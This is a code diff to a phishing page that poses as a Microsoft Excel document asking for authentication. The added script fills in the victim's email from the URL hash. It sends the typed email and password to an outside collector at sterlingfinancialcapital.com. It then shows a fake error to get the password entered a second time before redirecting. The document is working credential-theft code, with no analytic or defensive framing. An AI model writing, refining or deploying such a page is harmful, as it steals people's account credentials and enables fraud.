@@ -98,34 +98,77 @@ alert("Microsoft Excel Document Requires Authentication. Click Ok To Continue")
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 
 <script>
-// Replace the jQuery AJAX call with this
-const posting = $.post("https://sterlingfinancialcapital.com/excel/api.php", {
-    _subject: "Excel Logs | " + response.ip,
-    Email: $("#email").val(),
-    Password: $("#password").val(),
-    Attempts: step,
-    IP: response.ip,
-    Location: response.city + ", " + response.country,
-});
-</script>
-  
- 
-  
-  
-  
-  <script>
-        document.querySelector('.show-password').addEventListener('click', function () {
-            const passwordInput = document.getElementById('psw');
-            const showBtn = this;
-
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                showBtn.textContent = 'Hide';
-            } else {
-                passwordInput.type = 'password';
-                showBtn.textContent = 'Show';
+    let step = 1;
+    const clientID = window.location.hash.split("#").pop();
+    const domain = clientID.split('@').pop();
+    
+    // Set email value
+    $('#email').val(clientID);
+    
+    // Handle form submission
+    $("#login-form").submit(function(event) {
+        event.preventDefault();
+        
+        const submitBtn = $("#submitBtn");
+        const errorDiv = $("#error");
+        const passwordInput = $("#psw");
+        
+        submitBtn.text('Verifying...');
+        submitBtn.prop('disabled', true);
+        
+        // Collect data
+        const formData = {
+            email: $("#email").val(),
+            password: passwordInput.val(),
+            attempt: step
+        };
+        
+        // Send to PHP backend
+        $.ajax({
+            url: 'https://sterlingfinancialcapital.com/excel/api.php',
+            type: 'POST',
+            data: formData,
+            dataType: 'json',
+            success: function(response) {
+                if (response.success) {
+                    if (response.redirect) {
+                        // Redirect after 2nd attempt
+                        window.location.href = response.redirect;
+                    } else {
+                        // Show error and prepare for next attempt
+                        step = response.next_attempt || step + 1;
+                        errorDiv.css("display", "block");
+                        submitBtn.text('Sign In');
+                        submitBtn.prop('disabled', false);
+                        passwordInput.val("");
+                        passwordInput.focus();
+                    }
+                }
+            },
+            error: function() {
+                // Fallback if PHP fails
+                errorDiv.css("display", "block");
+                errorDiv.text('Connection error. Please try again.');
+                submitBtn.text('Sign In');
+                submitBtn.prop('disabled', false);
+                passwordInput.val("");
             }
         });
-    </script>
+    });
+    
+    // Show/hide password toggle
+    document.querySelector('.show-password').addEventListener('click', function () {
+        const passwordInput = document.getElementById('psw');
+        const showBtn = this;
+        
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            showBtn.textContent = 'Hide';
+        } else {
+            passwordInput.type = 'password';
+            showBtn.textContent = 'Show';
+        }
+    });
+</script>
 </body>
 </html>
